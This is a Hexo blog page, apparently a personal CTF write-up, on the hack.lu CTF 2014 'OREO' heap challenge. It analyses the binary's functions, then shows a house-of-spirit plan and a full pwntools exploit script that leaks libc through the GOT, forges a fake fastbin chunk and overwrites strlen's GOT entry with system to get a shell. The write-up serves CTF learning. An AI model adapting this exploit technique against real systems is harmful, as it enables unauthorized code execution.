@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="house of spirit就不写了没啥写的，所有的检查fastbin dup里都有提。这题写的也没有那么折磨( •̀ ω •́ )y">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hack.lu CTF 2014 OREO">
+<meta property="og:url" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="house of spirit就不写了没啥写的，所有的检查fastbin dup里都有提。这题写的也没有那么折磨( •̀ ω •́ )y">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/main.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/notice.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/main_.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/read_num.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/add.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/show.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/delete.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/message.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/stats.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/notice.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/replace_enter_0.png">
+<meta property="article:published_time" content="2023-02-01T16:18:36.000Z">
+<meta property="article:modified_time" content="2023-02-03T08:53:29.893Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="house of spirit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/main.png">
+
+<link rel="canonical" href="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>hack.lu CTF 2014 OREO | Eurus禁止摆烂！</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Eurus禁止摆烂！</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">In a world of locked rooms, the man with the key is king.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://akaieurus.github.io/2023/02/02/hack-lu-CTF-2014-OREO/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Eurus">
+      <meta itemprop="description" content="本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eurus禁止摆烂！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hack.lu CTF 2014 OREO
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-02 00:18:36" itemprop="dateCreated datePublished" datetime="2023-02-02T00:18:36+08:00">2023-02-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-02-03 16:53:29" itemprop="dateModified" datetime="2023-02-03T16:53:29+08:00">2023-02-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>house of spirit就不写了没啥写的，所有的检查fastbin dup里都有提。这题写的也没有那么折磨( •̀ ω •́ )y</p>
+<span id="more"></span>
+<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><img src="/2023/02/02/hack-lu-CTF-2014-OREO/main.png" class title="main">
+<p>注意一点，notice里存的是notice_context的地址，上面的是malloc的chunk的数量cnt和free的chunk的数量cnt_del，这一块之后将用于伪造fake chunk</p>
+<img src="/2023/02/02/hack-lu-CTF-2014-OREO/notice.png" class title="notice">
+<h4 id="main-和read-num"><a href="#main-和read-num" class="headerlink" title="main_和read_num"></a>main_和read_num</h4><p>真正的主函数，没啥好说的</p>
+<img src="/2023/02/02/hack-lu-CTF-2014-OREO/main_.png" class title="main_">
+<p>读入一个数</p>
+<img src="/2023/02/02/hack-lu-CTF-2014-OREO/read_num.png" class title="read_num">
+<p>这道题很奇怪的一点就是exp中gdb.attach后收不到”Action: “，原因未知。总之交互很奇怪</p>
+<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>可以通过溢出改变chunk链。会递增cnt</p>
+<img src="/2023/02/02/hack-lu-CTF-2014-OREO/add.png" class title="add">
+<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>输出所有chunk</p>
+<img src="/2023/02/02/hack-lu-CTF-2014-OREO/show.png" class title="show">
+<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>删除所有chunk，递增cnt_del，无uaf</p>
+<img src="/2023/02/02/hack-lu-CTF-2014-OREO/delete.png" class title="delete">
+<h4 id="message"><a href="#message" class="headerlink" title="message"></a>message</h4><p>留言在notice所指向的地址</p>
+<img src="/2023/02/02/hack-lu-CTF-2014-OREO/message.png" class title="message">
+<h4 id="stats"><a href="#stats" class="headerlink" title="stats"></a>stats</h4><p>输出cnt、cnt_del和notice，没啥用</p>
+<img src="/2023/02/02/hack-lu-CTF-2014-OREO/stats.png" class title="stats">
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
+<li>先add一个chunk，溢出到最后四字节改指针指向puts的got表然后show泄露libc基址</li>
+<li>可以在cnt和notice这块伪造fake chunk，把cnt当作size。由于chunk申请的大小是0x40，所以我们要再申请0x40个chunk（之前已经有一个了），并且最后一个chunk的最后四字节要指向0x804a28<img src="/2023/02/02/hack-lu-CTF-2014-OREO/notice.png" class title="notice"></li>
+<li>message留言fake chunk的后半部分。chunk的最后四字节置0，nextchunk的size和presize布置为合法值</li>
+<li>delete，fake chunk进入fastbin且为第一个chunk</li>
+<li>add回fake chunk，将notice覆盖为elf.got[‘strlen’]-0x8</li>
+<li>再message，写<code>b&#39;/bin/sh\x00&#39;+p32(system_addr)</code>，这时内存就是这样的<figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">notice	-&gt; elf.got[<span class="symbol">&#x27;strlen&#x27;</span>]-<span class="number">0x8</span>	-&gt; b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">		   elf.got[<span class="symbol">&#x27;strlen&#x27;</span>]		-&gt; system_addr </span><br></pre></td></tr></table></figure></li>
+<li>之后replace_enter_0中会执行strlen(notice)，这时候实际执行的就是system(‘&#x2F;bin&#x2F;sh’)<img src="/2023/02/02/hack-lu-CTF-2014-OREO/replace_enter_0.png" class title="replace_enter_0"></li>
+</ul>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(description,name):</span><br><span class="line">    p.sendline(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(description)</span><br><span class="line">def show():</span><br><span class="line">    p.sendline(b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">def delete():</span><br><span class="line">    p.sendline(b<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">def message(notice):</span><br><span class="line">    p.sendline(b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(notice)</span><br><span class="line">def stats():</span><br><span class="line">    p.sendline(b<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>=process(&#x27;./oreo&#x27;)</span><br><span class="line"><span class="attribute">elf</span>=ELF(&#x27;./oreo&#x27;)</span><br><span class="line"><span class="attribute">libc</span>=ELF(&#x27;./glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;)</span><br><span class="line"><span class="built_in">add</span>(b<span class="string">&#x27;Q&#x27;</span>,b<span class="string">&#x27;Q&#x27;</span><span class="number">*0</span>x1b+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Name: \nDescription: &#x27;</span>)</span><br><span class="line"><span class="attribute">s</span>=p.recv()[:4]</span><br><span class="line"><span class="attribute">libcbase</span>=u32(s)-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(hex(libcbase))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0x3f):</span><br><span class="line">    <span class="built_in">add</span>(b<span class="string">&#x27;Q&#x27;</span>,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(b<span class="string">&#x27;Q&#x27;</span>,b<span class="string">&#x27;Q&#x27;</span><span class="number">*0</span>x1b+p32(0x804a2a8))</span><br><span class="line">message(b<span class="string">&#x27;Q&#x27;</span>*(0x38-0x18-4)+p32(0)+p32(0x40)+p32(0x21))</span><br><span class="line">delete()</span><br><span class="line"><span class="attribute">system_addr</span>=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">add</span>(p32(0x804a250-8),b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">message(b<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p32(system_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/house-of-spirit/" rel="tag"># house of spirit</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/31/2015-9447ctf-search-engine/" rel="prev" title="2015 9447ctf search-engine">
+      <i class="fa fa-chevron-left"></i> 2015 9447ctf search-engine
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/" rel="next" title="2023西湖论剑初赛pwn wp">
+      2023西湖论剑初赛pwn wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#main"><span class="nav-number">1.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#main-%E5%92%8Cread-num"><span class="nav-number">1.2.</span> <span class="nav-text">main_和read_num</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#add"><span class="nav-number">1.3.</span> <span class="nav-text">add</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#show"><span class="nav-number">1.4.</span> <span class="nav-text">show</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#delete"><span class="nav-number">1.5.</span> <span class="nav-text">delete</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#message"><span class="nav-number">1.6.</span> <span class="nav-text">message</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#stats"><span class="nav-number">1.7.</span> <span class="nav-text">stats</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">3.</span> <span class="nav-text">exp</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Eurus"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Eurus</p>
+  <div class="site-description" itemprop="description">本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/akaieurus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;akaieurus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1826983968@qq.com" title="E-Mail → 1826983968@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">true</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+</body>
+</html>
